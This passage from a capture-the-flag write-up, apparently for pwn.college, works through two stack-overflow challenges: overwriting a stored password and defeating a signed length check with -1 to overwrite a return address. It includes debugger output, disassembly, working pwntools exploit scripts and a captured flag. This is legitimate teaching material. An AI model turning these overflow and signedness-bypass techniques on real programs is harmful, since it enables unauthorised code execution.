pwndbg> break *(challenge+314)
Breakpoint 1 at 0x58d45125faf4
```

```
pwndbg> run
Starting program: /challenge/login-leakage-hard 
Payload size: 2
Send your payload (up to 2 bytes)!
aa

Breakpoint 1, 0x00005ceaa0cb5af4 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
 RBX  0x5ceaa0cb5bd0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7827536e01f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7ffd75791218 ◂— 0x4071f3148c64193a
 RDI  0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
 RSI  0x7ffd75791218 ◂— 0x4071f3148c64193a
 R8   0x23
 R9   0x23
 R10  0x5ceaa0cb614c ◂— ' bytes)!\n'
 R11  0x246
 R12  0x5ceaa0cb51e0 (_start) ◂— endbr64 
 R13  0x7ffd75792350 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd75791230 —▸ 0x7ffd75792260 ◂— 0
 RSP  0x7ffd75790bc0 ◂— 0
 RIP  0x5ceaa0cb5af4 (challenge+314) ◂— call strcmp@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5ceaa0cb5af4 <challenge+314>    call   strcmp@plt                  <strcmp@plt>
        s1: 0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
        s2: 0x7ffd75791218 ◂— 0x4071f3148c64193a
 
   0x5ceaa0cb5af9 <challenge+319>    test   eax, eax
   0x5ceaa0cb5afb <challenge+321>    je     challenge+345               <challenge+345>
 
   0x5ceaa0cb5afd <challenge+323>    lea    rdi, [rip + 0x67c]     RDI => 0x5ceaa0cb6180 ◂— 'Password check failed! Exiting!'
   0x5ceaa0cb5b04 <challenge+330>    call   puts@plt                    <puts@plt>
 
   0x5ceaa0cb5b09 <challenge+335>    mov    edi, 1                 EDI => 1
   0x5ceaa0cb5b0e <challenge+340>    call   exit@plt                    <exit@plt>
 
   0x5ceaa0cb5b13 <challenge+345>    lea    rdi, [rip + 0x686]     RDI => 0x5ceaa0cb61a0 ◂— 'Password check passed!'
   0x5ceaa0cb5b1a <challenge+352>    call   puts@plt                    <puts@plt>
 
   0x5ceaa0cb5b1f <challenge+357>    mov    eax, 0                 EAX => 0
   0x5ceaa0cb5b24 <challenge+362>    call   win                         <win>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd75790bc0 ◂— 0
01:0008│-668     0x7ffd75790bc8 —▸ 0x7ffd75792368 —▸ 0x7ffd75793698 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-660     0x7ffd75790bd0 —▸ 0x7ffd75792358 —▸ 0x7ffd7579367a ◂— '/challenge/login-leakage-hard'
03:0018│-658     0x7ffd75790bd8 ◂— 0x100000000
04:0020│-650     0x7ffd75790be0 ◂— 0
05:0028│-648     0x7ffd75790be8 ◂— 2
06:0030│ rax rdi 0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
07:0038│-638     0x7ffd75790bf8 ◂— 0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5ceaa0cb5af4 challenge+314
   1   0x5ceaa0cb5bc2 main+134
   2   0x7827535f6083 __libc_start_main+243
   3   0x5ceaa0cb520e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

* [x] Location of buffer: `0x7ffd75790bf0`
* [x] Location of password: `0x7ffd75791218`

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/login-leakage-hard')

# Initialize values
buffer_addr = 0x7ffd75790bf0
password_addr = 0x7ffd75791218
# addr_of_saved_bp = 0x7ffe2e4a66a0
password = 0xdeadbeeffacade00

# Calculate offset & payload_size
offset = password_addr - buffer_addr
payload_size = offset + 8

# Build payload
payload = p64(password)
payload += b"A" * (offset - 8)
payload += p64(password)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~login-leakage-hard:~$ python ~/script.py 
[+] Starting local process '/challenge/login-leakage-hard': pid 475
/home/hacker/script.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to 1584 bytes)!
[*] Process '/challenge/login-leakage-hard' stopped with exit code 0 (pid 475)
Password check passed!
You win! Here is your flag:
pwn.college{MQmBteRVgsAkLzTDm3hAjp7roKm.QXxgzN4EDL4ITM0EzW}


Goodbye!
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Bounds Breaker (Easy)

```
hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
###
### Welcome to /challenge/bounds-breaker-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffcefa6de50 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffcefa6de58 (rsp+0x0008) | 38 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f038 |
| 0x00007ffcefa6de60 (rsp+0x0010) | 28 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f028 |
| 0x00007ffcefa6de68 (rsp+0x0018) | 23 27 9a 16 01 00 00 00 | 0x00000001169a2723 |
| 0x00007ffcefa6de70 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffcefa6de78 (rsp+0x0028) | 51 59 84 16 00 00 00 00 | 0x0000000016845951 |
| 0x00007ffcefa6de80 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee8 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffcefa6def0 (rsp+0x00a0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
| 0x00007ffcefa6def8 (rsp+0x00a8) | 80 de a6 ef fc 7f 00 00 | 0x00007ffcefa6de80 |
| 0x00007ffcefa6df00 (rsp+0x00b0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
| 0x00007ffcefa6df08 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffcefa6de50, and our base pointer points to 0x7ffcefa6df00.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffcefa6de80, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 106 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffcefa6df08, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (106 to fill the buffer,
30 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: 2
This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
You made it past the check! Because the read() call will interpret
your size differently than the check above, the resulting read will
be unstable and might fail. You will likely have to try this several
times before your input is actually read.
You have chosen to send 2 bytes of input!
This will allow you to write from 0x7ffcefa6de80 (the start of the input buffer)
right up to (but not including) 0x7ffcefa6de82 (which is -104 bytes beyond the end of the buffer).
Of these, you will overwrite -134 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffcefa6df08, 136 bytes past the start of the input buffer)
with 0x4020f3, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffcefa6de50 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffcefa6de58 (rsp+0x0008) | 38 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f038 |
| 0x00007ffcefa6de60 (rsp+0x0010) | 28 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f028 |
| 0x00007ffcefa6de68 (rsp+0x0018) | 23 27 9a 16 01 00 00 00 | 0x00000001169a2723 |
| 0x00007ffcefa6de70 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffcefa6de78 (rsp+0x0028) | 51 59 84 16 02 00 00 00 | 0x0000000216845951 |
| 0x00007ffcefa6de80 (rsp+0x0030) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
| 0x00007ffcefa6de88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee8 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffcefa6def0 (rsp+0x00a0) | 30 ef a6 ef 02 00 00 00 | 0x00000002efa6ef30 |
| 0x00007ffcefa6def8 (rsp+0x00a8) | 80 de a6 ef fc 7f 00 00 | 0x00007ffcefa6de80 |
| 0x00007ffcefa6df00 (rsp+0x00b0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
| 0x00007ffcefa6df08 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffcefa6de80
- the saved frame pointer (of main) is at 0x7ffcefa6df00
- the saved return address (previously to main) is at 0x7ffcefa6df08
- the saved return address is now pointing to 0x4028dd.
- the address of win() is 0x4020f3.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
### Goodbye!
```

```
hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
###
### Welcome to /challenge/bounds-breaker-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeb0dd38b0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffeb0dd38b8 (rsp+0x0008) | 98 4a dd b0 fe 7f 00 00 | 0x00007ffeb0dd4a98 |
| 0x00007ffeb0dd38c0 (rsp+0x0010) | 88 4a dd b0 fe 7f 00 00 | 0x00007ffeb0dd4a88 |
| 0x00007ffeb0dd38c8 (rsp+0x0018) | 23 27 86 bc 01 00 00 00 | 0x00000001bc862723 |
| 0x00007ffeb0dd38d0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffeb0dd38d8 (rsp+0x0028) | 51 59 70 bc 00 00 00 00 | 0x00000000bc705951 |
| 0x00007ffeb0dd38e0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd38e8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd38f0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd38f8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3900 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3908 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3910 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3918 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3920 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3928 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3930 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3938 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3940 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb0dd3948 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffeb0dd3950 (rsp+0x00a0) | 90 49 dd b0 fe 7f 00 00 | 0x00007ffeb0dd4990 |
| 0x00007ffeb0dd3958 (rsp+0x00a8) | e0 38 dd b0 fe 7f 00 00 | 0x00007ffeb0dd38e0 |
| 0x00007ffeb0dd3960 (rsp+0x00b0) | 90 49 dd b0 fe 7f 00 00 | 0x00007ffeb0dd4990 |
| 0x00007ffeb0dd3968 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffeb0dd38b0, and our base pointer points to 0x7ffeb0dd3960.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffeb0dd38e0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 106 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffeb0dd3968, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (106 to fill the buffer,
30 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: 107
This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
Provided size is too large!
```

This challenge checks if the payload size entered by the user overflows the length of the buffer. If yes, it exits early without reading the payload.

It does hint somehting about using a two's complement but we'll se when we get there.

### `challenge()`

```
pwndbg> disassemble challenge

# ---- snip ----

   0x00000000004024fc <+770>:   call   0x401180 <__isoc99_scanf@plt>
   0x0000000000402501 <+775>:   lea    rdi,[rip+0x13b0]        # 0x4038b8
   0x0000000000402508 <+782>:   call   0x401110 <puts@plt>
   0x000000000040250d <+787>:   lea    rdi,[rip+0x13e4]        # 0x4038f8
   0x0000000000402514 <+794>:   call   0x401110 <puts@plt>
   0x0000000000402519 <+799>:   lea    rdi,[rip+0x1418]        # 0x403938
   0x0000000000402520 <+806>:   call   0x401110 <puts@plt>
   0x0000000000402525 <+811>:   lea    rdi,[rip+0x144c]        # 0x403978
   0x000000000040252c <+818>:   call   0x401110 <puts@plt>
   0x0000000000402531 <+823>:   mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000402537 <+829>:   cmp    eax,0x6a
   0x000000000040253a <+832>:   jle    0x402552 <challenge+856>
   0x000000000040253c <+834>:   lea    rdi,[rip+0x1456]        # 0x403999
   0x0000000000402543 <+841>:   call   0x401110 <puts@plt>
   0x0000000000402548 <+846>:   mov    edi,0x1
   0x000000000040254d <+851>:   call   0x401190 <exit@plt>
   0x0000000000402552 <+856>:   lea    rdi,[rip+0x145f]        # 0x4039b8
   0x0000000000402559 <+863>:   call   0x401110 <puts@plt>
   0x000000000040255e <+868>:   lea    rdi,[rip+0x149b]        # 0x403a00

# ---- snip ----

   0x00000000004026b3 <+1209>:  mov    eax,DWORD PTR [rbp-0x84]
   0x00000000004026b9 <+1215>:  mov    edx,eax
   0x00000000004026bb <+1217>:  mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004026bf <+1221>:  mov    rsi,rax
   0x00000000004026c2 <+1224>:  mov    edi,0x0
   0x00000000004026c7 <+1229>:  call   0x401150 <read@plt>

# ---- snip ----
```

Whatever payload size we send, is stored at the address pointed to by `rbp-0x84`. 

Then the program compares that value with `0x6a`. If the value is lesser, it skips the `exit@plt` call and continues execution.

Later, the same value is moved in `rax`, and then moved into `rdx` before making the call to `read@plt`, where it is treated as the count of bytes to be read.

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

| arg0 (%rdi)     | arg1 (%rsi) | arg2 (%rdx)  | 
| :----------     | :---------- | :----------- |
| unsigned int fd | char *buf   | size_t count |

This is where the hint comes into play.

### [Two's compliment](https://en.wikipedia.org/wiki/Two%27s_complement)

It is additive inverse operation, so negative numbers are represented by the two's complement of the absolute value. Let's look at an example.

```
## Negative number: 

-1


## Absolute value: 

1 
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000001


## One's compliment: 

11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111110


## Two's complement: 

11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111110
+                                                                     1
-----------------------------------------------------------------------
11111111 11111111 11111111 11111111 11111111 11111111 11111111 11111111
```

Therefore the 64-bit two's compliment of -1 is `0xffffffffffffffff`.

Let's look at how the program behaves if we provide the `-1` as the length of our payload size.

```
# ---- snip ----

   0x0000000000402531 <+823>:   mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000402537 <+829>:   cmp    eax,0x6a
   0x000000000040253a <+832>:   jle    0x402552 <challenge+856>

# ---- snip ----
```

In the above snippet, `jle` is used for signed comparison. As `-1 < 0x6a`, the condition will be satisfied, the program will not exit.

```
# ---- snip ----

   0x00000000004026b3 <+1209>:  mov    eax,DWORD PTR [rbp-0x84]
   0x00000000004026b9 <+1215>:  mov    edx,eax
   0x00000000004026bb <+1217>:  mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004026bf <+1221>:  mov    rsi,rax
   0x00000000004026c2 <+1224>:  mov    edi,0x0
   0x00000000004026c7 <+1229>:  call   0x401150 <read@plt>

# ---- snip ----
```

As we saw before, `edx` holds the argument which specifies the number of bytes to be read. The problem is, number of bytes can never be negative, so `read@plt` treats this argument as an unsigned integer. Thus `0xffffffffffffffff` is not interpreted as `-1` but rather as `18446744073709551615`.

```py
In [1]: 0xffffffffffffffff
Out[1]: 18446744073709551615
```

As a result of this mismatch between how `jle` and `read@plt` interpret our payload size input, we are able to pass the check, and overflow the buffer.

### `win()`

```
hacker@program-security~bounds-breaker-easy:~$ objdump --disassemble=win -M intel /challenge/bounds-breaker-easy 

/challenge/bounds-breaker-easy:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .plt.sec:

Disassembly of section .text:

00000000004020f3 <win>:
  4020f3:       f3 0f 1e fa             endbr64
  4020f7:       55                      push   rbp
  4020f8:       48 89 e5                mov    rbp,rsp
  4020fb:       48 8d 3d ee 0f 00 00    lea    rdi,[rip+0xfee]        # 4030f0 <_IO_stdin_used+0xf0>
  402102:       e8 09 f0 ff ff          call   401110 <puts@plt>
  402107:       be 00 00 00 00          mov    esi,0x0
  40210c:       48 8d 3d f9 0f 00 00    lea    rdi,[rip+0xff9]        # 40310c <_IO_stdin_used+0x10c>
  402113:       b8 00 00 00 00          mov    eax,0x0
  402118:       e8 53 f0 ff ff          call   401170 <open@plt>
  40211d:       89 05 1d 3f 00 00       mov    DWORD PTR [rip+0x3f1d],eax        # 406040 <flag_fd.5714>
  402123:       8b 05 17 3f 00 00       mov    eax,DWORD PTR [rip+0x3f17]        # 406040 <flag_fd.5714>
  402129:       85 c0                   test   eax,eax
  40212b:       79 4d                   jns    40217a <win+0x87>
  40212d:       e8 ce ef ff ff          call   401100 <__errno_location@plt>
  402132:       8b 00                   mov    eax,DWORD PTR [rax]
  402134:       89 c7                   mov    edi,eax
  402136:       e8 65 f0 ff ff          call   4011a0 <strerror@plt>
  40213b:       48 89 c6                mov    rsi,rax
  40213e:       48 8d 3d d3 0f 00 00    lea    rdi,[rip+0xfd3]        # 403118 <_IO_stdin_used+0x118>
  402145:       b8 00 00 00 00          mov    eax,0x0
  40214a:       e8 e1 ef ff ff          call   401130 <printf@plt>
  40214f:       e8 ec ef ff ff          call   401140 <geteuid@plt>
  402154:       85 c0                   test   eax,eax
  402156:       74 18                   je     402170 <win+0x7d>
  402158:       48 8d 3d e9 0f 00 00    lea    rdi,[rip+0xfe9]        # 403148 <_IO_stdin_used+0x148>
  40215f:       e8 ac ef ff ff          call   401110 <puts@plt>
  402164:       48 8d 3d 05 10 00 00    lea    rdi,[rip+0x1005]        # 403170 <_IO_stdin_used+0x170>
  40216b:       e8 a0 ef ff ff          call   401110 <puts@plt>
  402170:       bf ff ff ff ff          mov    edi,0xffffffff
  402175:       e8 16 f0 ff ff          call   401190 <exit@plt>
  40217a:       8b 05 c0 3e 00 00       mov    eax,DWORD PTR [rip+0x3ec0]        # 406040 <flag_fd.5714>
  402180:       ba 00 01 00 00          mov    edx,0x100
  402185:       48 8d 35 d4 3e 00 00    lea    rsi,[rip+0x3ed4]        # 406060 <flag.5713>
  40218c:       89 c7                   mov    edi,eax
  40218e:       e8 bd ef ff ff          call   401150 <read@plt>
  402193:       89 05 c7 3f 00 00       mov    DWORD PTR [rip+0x3fc7],eax        # 406160 <flag_length.5715>
  402199:       8b 05 c1 3f 00 00       mov    eax,DWORD PTR [rip+0x3fc1]        # 406160 <flag_length.5715>
  40219f:       85 c0                   test   eax,eax
  4021a1:       7f 2c                   jg     4021cf <win+0xdc>
  4021a3:       e8 58 ef ff ff          call   401100 <__errno_location@plt>
  4021a8:       8b 00                   mov    eax,DWORD PTR [rax]
  4021aa:       89 c7                   mov    edi,eax
  4021ac:       e8 ef ef ff ff          call   4011a0 <strerror@plt>
  4021b1:       48 89 c6                mov    rsi,rax
  4021b4:       48 8d 3d 0d 10 00 00    lea    rdi,[rip+0x100d]        # 4031c8 <_IO_stdin_used+0x1c8>
  4021bb:       b8 00 00 00 00          mov    eax,0x0
  4021c0:       e8 6b ef ff ff          call   401130 <printf@plt>
  4021c5:       bf ff ff ff ff          mov    edi,0xffffffff
  4021ca:       e8 c1 ef ff ff          call   401190 <exit@plt>
  4021cf:       8b 05 8b 3f 00 00       mov    eax,DWORD PTR [rip+0x3f8b]        # 406160 <flag_length.5715>
  4021d5:       48 98                   cdqe
  4021d7:       48 89 c2                mov    rdx,rax
  4021da:       48 8d 35 7f 3e 00 00    lea    rsi,[rip+0x3e7f]        # 406060 <flag.5713>
  4021e1:       bf 01 00 00 00          mov    edi,0x1
  4021e6:       e8 35 ef ff ff          call   401120 <write@plt>
  4021eb:       48 8d 3d 00 10 00 00    lea    rdi,[rip+0x1000]        # 4031f2 <_IO_stdin_used+0x1f2>
  4021f2:       e8 19 ef ff ff          call   401110 <puts@plt>
  4021f7:       90                      nop
  4021f8:       5d                      pop    rbp
  4021f9:       c3                      ret

Disassembly of section .fini:
```

Before we write the exploit, let's get the address of the `win()` function.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/bounds-breaker-easy')

# Initialize values
buffer_addr = 0x7ffcae8fa380
addr_of_stored_ip = 0x7ffcae8fa408
win_func_addr = 0x4020f3

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
payload_size = -1

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~bounds-breaker-easy:~$ python ~/script.py 
[+] Starting local process '/challenge/bounds-breaker-easy': pid 36721
/home/hacker/script.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to -1 bytes)!
[*] Process '/challenge/bounds-breaker-easy' stopped with exit code -11 (SIGSEGV) (pid 36721)
You sent 144 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeffbedca0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffeffbedca8 (rsp+0x0008) | 88 ee be ff fe 7f 00 00 | 0x00007ffeffbeee88 |
| 0x00007ffeffbedcb0 (rsp+0x0010) | 78 ee be ff fe 7f 00 00 | 0x00007ffeffbeee78 |
| 0x00007ffeffbedcb8 (rsp+0x0018) | 23 b7 54 7e 01 00 00 00 | 0x000000017e54b723 |
| 0x00007ffeffbedcc0 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffeffbedcc8 (rsp+0x0028) | 51 e9 3e 7e ff ff ff ff | 0xffffffff7e3ee951 |
| 0x00007ffeffbedcd0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedcd8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedce0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedce8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedcf0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedcf8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd00 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd08 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd10 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffeffbedd18 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
